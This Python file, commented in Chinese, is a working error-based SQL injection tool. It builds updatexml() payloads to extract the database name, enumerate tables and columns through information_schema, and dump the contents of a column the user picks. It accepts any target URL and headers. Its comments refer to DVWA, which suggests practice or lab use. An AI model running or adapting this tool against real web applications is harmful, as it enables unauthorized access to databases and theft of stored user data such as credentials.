import requests
import re
from includee import printf
from includee import sql_error_inject
'''
用updatexml进行报错注入
'''


def sql_error_attack(url, headers):
    printf("正在猜解数据库名...")
    sql = f"1'and(select+updatexml(1%2Cconcat(0x7e%2C(select+database()))%2C0x7e))%23"
    database_name = sql_error_inject(sql, url, headers)
    printf("数据库名为:" + database_name)
    printf("是否继续，y/N  ")
    n = input()
    if n == 'y' or n == 'Y':
        printf("正在继续")
    else:
        quit()
    printf("正在猜解数据库"+database_name+"的表信息")
    # 1' and updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema='dvwa' limit 0,1)),0)%23
    table_name = []
    for i in range(10):
        sql = f"1' and updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema='{database_name}' limit {i},1)),0)%23"
        r = sql_error_inject(sql, url, headers)
        if r != '0':
            table_name.append(r)
        else:
            break

    printf("正在打印所有表信息...")
    print("\033[0;33m-\033[0m" * 20)
    j = 1
    for i in table_name:
        str1 = f'[{j}]'
        print(str1 + i)
        j += 1
    print("\033[0;33m-\033[0m" * 20)
    printf('请输入你想要查看的表名:')
    chose_table_name = input()
    # 猜解想要知道的表内的列信息
    printf("正在猜解表" + chose_table_name + "的信息...")
    # 1' and updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema. columns WHERE table_name='users' and table_schema='dvwa' limit 0,1)),0)%23
    column_name = []
    for i in range(20):
        sql = f"1' and updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema. columns WHERE table_name='{chose_table_name}' and table_schema='{database_name}' limit {i},1)),0)%23"
        r = sql_error_inject(sql, url, headers)
        if r != '0':
            column_name.append(r)
        else:
            break

    printf("正在打印" + chose_table_name + "表的所有字段")
    print("\033[0;33m-\033[0m" * 20)
    num = 1
    for i in column_name:
        n = f"[{num}]"
        print(n + i)
        num += 1
    print("\033[0;33m-\033[0m" * 20)
    while True:
        printf("请选择想要查看的字段信息,退出请输入!q")
        column_in = input()
        if column_in == '!q':
            printf("注入结束")
            quit()
        else:
            # 1' and updatexml(1,concat(0x7e,(SELECT user FROM users limit 2,1)),1)#
            # 1'+and+updatexml(1%2Cconcat(0x7e%2C(SELECT+user+FROM+users+limit+2%2C1))%2C1)%23
            data = []
            for i in range(20):
                sql = f"1'+and+updatexml(1%2Cconcat(0x7e%2C(SELECT+{column_in}+FROM+{chose_table_name}+limit+{i}%2C1))%2C1)%23"
                r = sql_error_inject(sql, url, headers)
                if r != '0':
                    data.append(r)
                else:
                    break
            if len(data) != 0:
                printf("正在打印" + column_in)
                print("\033[0;33m-\033[0m" * 20)
                num = 1
                for i in data:
                    n = f"[{num}]"
                    print(n + i)
                    num += 1
                print("\033[0;33m-\033[0m" * 20)
            else:
                printf("无信息")
